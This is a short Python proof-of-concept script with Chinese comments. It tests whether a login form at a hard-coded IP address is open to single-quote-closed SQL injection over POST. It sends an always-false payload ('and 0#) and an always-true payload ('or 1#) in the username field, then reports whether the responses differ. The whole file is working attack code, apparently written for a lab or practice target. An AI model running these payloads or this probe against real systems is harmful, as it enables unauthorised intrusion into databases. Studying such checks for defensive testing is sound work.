"""
POST 类型的POC
Error! User does not exists
"""
import requests


def post_verify(url):
    payload1 = {
        "username": "'and 0#",  # 永远为假 回显 Error! User does not exists
        "submit":"Submit"
    }

    payload2 = {
        "username": "'or 1#",  # 永远为真
        "submit": "Submit"
    }
    res1 = requests.post(url, data=payload1)
    res2 = requests.post(url, data=payload2)
    if "User does not exists" in res1.text and "User name" in res2.text:
        print('%s 存在POST类型的单引号闭合的SQL注入'%url)
    else:
        print('%s 不存在POST类型的单引号闭合的SQL注入' % url)

if __name__ == '__main__':
    url = "http://120.25.24.45:32535/index.php"
    post_verify(url)
